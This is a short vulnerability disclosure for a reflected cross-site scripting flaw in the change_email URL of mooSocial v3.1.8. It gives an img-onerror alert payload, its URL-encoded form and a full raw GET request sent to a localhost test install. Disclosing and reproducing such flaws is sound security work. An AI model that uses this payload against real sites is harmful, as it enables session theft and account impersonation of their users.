# mooSocial: XSS
A reflected cross-site scripting (XSS) vulnerability in the change email function url of mooSocial v3.1.8 allows attackers to steal user's session cookies and impersonate their account via a crafted URL.


## Exploit - Proof of Concept (POC)

### Reflect cross-site scripting (XSS)
```
Payload : ahrixia"><img src=a onerror=alert(1)>ahrixia 
Payload (Url encoded): ahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia
```

GET Request on /moosocial/users/change_email : 
```
GET /moosocial/users/change_emailahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia?step1=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/moosocial/users/change_email
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: 19edc47bb57545288d88183ca75c9a0bmooSocial[theme]=Q2FrZQ%3D%3D.7AxYtZYvgA%3D%3D; 19edc47bb57545288d88183ca75c9a0bmooSocial[activity_feed]=Q2FrZQ%3D%3D.7R9bpposmi8%3D; 19edc47bb57545288d88183ca75c9a0bmooSocial[email]=Q2FrZQ%3D%3D.6Q1TvY0DlS5fSmsvsLm2; 19edc47bb57545288d88183ca75c9a0bmooSocial[password]=Q2FrZQ%3D%3D.6RpKvYg%3D; CAKEPHP=mujgia2m0cubmb5eg3q3th4fnb
Connection: close

```

![image](https://github.com/ahrixia/mooSocial-XSS2/assets/35935843/97684d10-e189-48c6-9dea-6f0afe4ec211)
